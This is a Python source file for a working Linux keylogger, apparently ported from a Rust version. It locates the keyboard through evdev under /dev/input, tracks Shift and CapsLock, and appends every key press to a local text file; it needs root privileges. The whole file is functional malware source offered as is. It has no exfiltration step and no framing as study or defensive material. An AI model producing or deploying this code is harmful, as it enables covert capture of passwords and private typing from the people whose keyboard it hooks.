import evdev
from evdev import ecodes
import os

class Keylogger:
    def __init__(self, log_path="./data/captured_keys.txt"):
        self.log_path = log_path
        self.modifiers = {
            'shift': False,
            'capslock': False
        }
        # Ensure the directory exists as per the Rust implementation 
        os.makedirs(os.path.dirname(self.log_path), exist_ok=True)

    def find_keyboard(self):
        """
        Matches the Rust logic of iterating through /dev/input to find 
        a device that supports specific keys (A, F1, F10).
        """
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        for device in devices:
            capabilities = device.capabilities()
            if ecodes.EV_KEY in capabilities:
                supported_keys = capabilities[ecodes.EV_KEY]
                # Check for KEY_A, KEY_F1, and KEY_F10 
                if all(k in supported_keys for k in [ecodes.KEY_A, ecodes.KEY_F1, ecodes.KEY_F10]):
                    return device
        return None

    def update_modifiers(self, code, value):
        """Updates the state of Shift and CapsLock."""
        # value 1 is press, 0 is release
        if code in [ecodes.KEY_LEFTSHIFT, ecodes.KEY_RIGHTSHIFT]:
            self.modifiers['shift'] = (value == 1)
        elif code == ecodes.KEY_CAPSLOCK and value == 1:
            self.modifiers['capslock'] = not self.modifiers['capslock']

    def run(self):
        """Starts the keylogging loop."""
        device = self.find_keyboard()
        if not device:
            print("[!] Could not find a valid keyboard device.")
            return

        print(f"[*] Hooked into: {device.name} ({device.path})")

        # Read events from the device
        for event in device.read_loop():
            if event.type == ecodes.EV_KEY:
                # Update modifier states 
                self.update_modifiers(event.code, event.value)

                # Only log on actual key presses (value == 1) 
                if event.value == 1:
                    key_name = evdev.ecodes.KEY[event.code].replace("KEY_", "")
                    
                    # Ignore modifier keys themselves in the final output
                    if "SHIFT" in key_name or "CAPSLOCK" in key_name:
                        continue

                    output = ""
                    if self.modifiers['shift']: output += "[SHIFT] "
                    if self.modifiers['capslock']: output += "[CAPS] "
                    output += f"{key_name} "

                    # Append to file as specified in the original code 
                    with open(self.log_path, "a") as f:
                        f.write(output + "\n")

if __name__ == "__main__":
    # Note: Requires sudo/root privileges to access /dev/input/
    logger = Keylogger()
    try:
        logger.run()
    except KeyboardInterrupt:
        print("\n[*] Keylogger stopped.")
